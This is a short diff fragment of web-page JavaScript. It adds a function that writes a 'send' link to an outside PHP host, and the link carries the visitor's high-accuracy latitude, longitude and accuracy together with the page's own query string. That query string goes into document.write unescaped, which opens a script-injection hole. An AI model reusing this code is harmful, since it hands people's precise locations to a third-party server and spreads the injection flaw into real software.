@@ -20,8 +20,10 @@ navigator.geolocation.getCurrentPosition( (position) => {
     enableHighAccuracy: true
 });
 
+function displayData(lat, lng, accu){
 
+var param = location.search
 
-
-
+document.write("<a href=http://yumaabckhh.php.xdomain.jp/h.php" + param + "&get=" + month + "月" + day + "日" + "%3Cbr%3E" + lat + "%3Cbr%3E" + lng + "%3Cbr%3E" + accu + ">送信</a><br><h1>送信押してね</h1><br><br>");
+}
 </script>
